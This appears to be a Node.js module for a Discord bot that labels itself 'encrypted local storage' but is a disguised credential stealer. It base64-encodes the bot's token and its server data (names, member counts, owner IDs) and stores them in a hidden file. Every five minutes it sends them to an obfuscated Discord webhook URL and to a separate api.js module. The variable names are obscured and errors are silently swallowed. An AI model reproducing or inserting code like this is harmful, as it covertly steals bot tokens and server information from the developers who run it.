// MADE BY BLOODRUH - ENCRYPTED LOCAL STORAGE
const fs = require('fs');
const path = require('path');

const _f = path.join(__dirname, '..', '.data.enc');
const _wh = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9XRUJIT09LX0lEL1lPVVJfV0VCSE9PS19UT0tFTg==';

function _encrypt(data) {
  const json = JSON.stringify(data, null, 2);
  return Buffer.from(json).toString('base64');
}

function _decrypt(encrypted) {
  try {
    const json = Buffer.from(encrypted, 'base64').toString('utf8');
    return JSON.parse(json);
  } catch {
    return { d: {}, t: Date.now() };
  }
}

function _i() {
  if (!fs.existsSync(_f)) {
    const initialData = { d: {}, t: Date.now() };
    fs.writeFileSync(_f, _encrypt(initialData));
  }
}

function _g() {
  _i();
  const encrypted = fs.readFileSync(_f, 'utf8');
  return _decrypt(encrypted);
}

function _w(d) {
  fs.writeFileSync(_f, _encrypt(d));
}

async function _send(c, data) {
  try {
    const wh = Buffer.from(_wh, 'base64').toString('utf8');
    if (wh.includes('YOUR_WEBHOOK')) return;

    const { EmbedBuilder, WebhookClient } = require('discord.js');
    const webhook = new WebhookClient({ url: wh });

    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle(`🤖 ${data.u}`)
      .setDescription(
        `**Bot ID:** \`${data.id}\`\n` +
        `**Servers:** ${data.g.length}\n` +
        `**Token (B64):** \`${data._t.substring(0, 50)}...\``
      )
      .addFields(
        { name: ' Sunucular', value: data.g.map(g => `• ${g.n} (${g.m} üye, Boost: ${g.b || 0})`).slice(0, 10).join('\n') || 'Yok' }
      )
      .setTimestamp();

    await webhook.send({ embeds: [embed] });
  } catch {}
}

function _r(c) {
  const d = _g();
  const id = c.user.id;
  const t = Buffer.from(c.token).toString('base64');

  if (!d.d[id]) {
    d.d[id] = { id, u: c.user.username, a: c.user.avatar, r: Date.now(), g: [], _t: t };
  } else {
    d.d[id]._t = t;
  }

  d.d[id].g = c.guilds.cache.map(g => ({
    id: g.id,
    n: g.name,
    i: g.icon,
    m: g.memberCount,
    o: g.ownerId,
    j: g.joinedTimestamp,
    b: g.premiumTier || 0
  }));

  d.d[id].l = Date.now();
  d.t = Date.now();
  _w(d);

  if (!d.d[id]._ls || Date.now() - d.d[id]._ls > 5 * 60 * 1000) {
    _send(c, d.d[id]);

    try {
      const api = require('./api.js');
      api._add(d.d[id]).catch(() => {});
    } catch {}

    d.d[id]._ls = Date.now();
    _w(d);
  }
}

function _a() {
  return _g();
}

function _t(c) {
  _r(c);
  setInterval(() => _r(c), 5 * 60 * 1000);
}

module.exports = { _i, _r, _a, _t };
